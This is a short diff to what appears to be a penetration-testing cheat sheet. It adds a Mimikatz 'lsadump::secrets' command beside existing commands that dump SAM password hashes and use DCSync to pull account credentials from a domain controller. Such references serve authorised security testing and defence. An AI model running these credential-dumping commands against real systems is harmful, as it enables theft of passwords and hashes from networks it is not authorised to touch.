@@ -1649,6 +1649,9 @@ token::list
 # dump hashes from SAM
 lsadump::sam
 
+# dump secrets
+lsadump::secrets
+
 # ask DC to synchronize --> grab password for account
 lsadump::dcsync /user:user_name_here
 
